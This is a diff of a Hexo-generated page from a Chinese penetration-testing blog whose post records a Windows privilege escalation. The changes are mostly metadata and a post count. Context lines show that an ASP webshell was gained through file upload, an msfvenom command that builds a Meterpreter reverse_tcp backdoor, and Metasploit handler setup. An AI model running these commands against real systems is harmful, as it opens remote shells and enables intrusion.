@@ -94,13 +94,13 @@
 
 
 
-  <meta name="description" content="通过任意文件上传获取到ASP webshell   生成msf meterpreter后门msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe &amp;gt; shell1.exe   启动监听use exploit/multi/handler   set PAYLOAD windows/meterpret">
+  <meta name="description" content="通过任意文件上传获取到ASP webshell   生成msf meterpreter后门msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe &amp;gt; shell1.exe">
 <meta name="keywords" content="渗透测试">
 <meta property="og:type" content="article">
 <meta property="og:title" content="记一次Windows提权过程">
 <meta property="og:url" content="https://ryaninf.github.io/2019/07/10/记一次Windows提权过程/index.html">
 <meta property="og:site_name" content="r0yanx&#39;s Blog">
-<meta property="og:description" content="通过任意文件上传获取到ASP webshell   生成msf meterpreter后门msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe &amp;gt; shell1.exe   启动监听use exploit/multi/handler   set PAYLOAD windows/meterpret">
+<meta property="og:description" content="通过任意文件上传获取到ASP webshell   生成msf meterpreter后门msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe &amp;gt; shell1.exe">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https://ryaninf.github.io/2019/07/10/记一次Windows提权过程/2019-07-09-17-25-26.png">
 <meta property="og:image" content="https://ryaninf.github.io/2019/07/10/记一次Windows提权过程/2019-07-09-17-28-46.png">
@@ -110,10 +110,10 @@
 <meta property="og:image" content="https://ryaninf.github.io/2019/07/10/记一次Windows提权过程/2019-07-09-17-38-23.png">
 <meta property="og:image" content="https://ryaninf.github.io/2019/07/10/记一次Windows提权过程/2019-07-09-17-39-17.png">
 <meta property="og:image" content="https://ryaninf.github.io/2019/07/10/记一次Windows提权过程/2019-07-09-17-41-18.png">
-<meta property="og:updated_time" content="2019-07-10T06:54:24.528Z">
+<meta property="og:updated_time" content="2019-07-22T03:49:38.197Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="记一次Windows提权过程">
-<meta name="twitter:description" content="通过任意文件上传获取到ASP webshell   生成msf meterpreter后门msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe &amp;gt; shell1.exe   启动监听use exploit/multi/handler   set PAYLOAD windows/meterpret">
+<meta name="twitter:description" content="通过任意文件上传获取到ASP webshell   生成msf meterpreter后门msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe &amp;gt; shell1.exe">
 <meta name="twitter:image" content="https://ryaninf.github.io/2019/07/10/记一次Windows提权过程/2019-07-09-17-25-26.png">
 
 
@@ -426,13 +426,23 @@
                 
               
 
-              <time title="创建时间：2019-07-10 09:25:10 / 修改时间：14:54:24" itemprop="dateCreated datePublished" datetime="2019-07-10T09:25:10+08:00">2019-07-10</time>
+              <time title="创建时间：2019-07-10 09:25:10" itemprop="dateCreated datePublished" datetime="2019-07-10T09:25:10+08:00">2019-07-10</time>
             </span>
           
 
           
             
 
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-07-22 11:49:38" itemprop="dateModified" datetime="2019-07-22T11:49:38+08:00">2019-07-22</time>
+              </span>
             
           
 
@@ -485,6 +495,7 @@
       
         <h3 id="通过任意文件上传获取到ASP-webshell"><a href="#通过任意文件上传获取到ASP-webshell" class="headerlink" title="通过任意文件上传获取到ASP webshell"></a>通过任意文件上传获取到ASP webshell</h3><p><img src="/2019/07/10/记一次Windows提权过程/2019-07-09-17-25-26.png" alt>  </p>
 <h3 id="生成msf-meterpreter后门"><a href="#生成msf-meterpreter后门" class="headerlink" title="生成msf meterpreter后门"></a>生成msf meterpreter后门</h3><pre><code class="shell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe &gt; shell1.exe  </code></pre>
+<a id="more"></a>
 <h3 id="启动监听"><a href="#启动监听" class="headerlink" title="启动监听"></a>启动监听</h3><pre><code class="shell">use exploit/multi/handler  
 set PAYLOAD windows/meterpreter/reverse_tcp  
 set LHOST x.x.x.x  
@@ -651,7 +662,7 @@ list_tokens -u  </code></pre>
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">8</span>
+                    <span class="site-state-item-count">9</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
